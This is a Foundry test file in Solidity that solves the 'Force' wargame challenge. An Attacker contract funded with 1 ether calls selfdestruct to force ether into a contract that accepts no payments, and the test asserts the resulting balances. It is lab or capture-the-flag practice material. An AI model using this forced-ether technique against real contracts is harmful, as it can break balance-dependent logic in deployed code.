//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";
import {console} from "forge-std/console.sol";

contract ForceTest is Test {
        Force public force;
        address public attacker = address(0x123);

        function setUp() public {
                vm.prank(attacker);
                force = new Force();
        }

        function testForceExploite() public{
                
                //Phase 1 : Check initial balance should  be 0
                uint256 initialBalance = address(force).balance;
                assertEq(initialBalance, 0);
                console.log("Initial balance Force contract :" , initialBalance);

                //Phase 2 : Deploy attacker contract with some ether
                Attacker attackerContract = new Attacker{value: 1 ether}(payable(address(force)));
                console.log("attacker balance Initial :", address(attackerContract).balance);

                //Phase 3 :Forcing Ether via Selfdestruct
                attackerContract.attack();

                //Phase 4 :Verify the balance of force contract
                uint256 finalBalance = address(force).balance;
                assertEq(finalBalance , 1 ether , "Final balance should be 1 ether");
                console.log("Final balance of  Force contract" , finalBalance);
                console.log("Final balance of attacker contract" , address(attackerContract).balance);


        }
}

contract Attacker{
        address payable public target;
        
        //Initialize with target 
        constructor(address payable _target) payable {
                target = _target;
        }

        //selfdestruct and send all the balance to the target
        function attack() public {
                selfdestruct(target);
        }

}
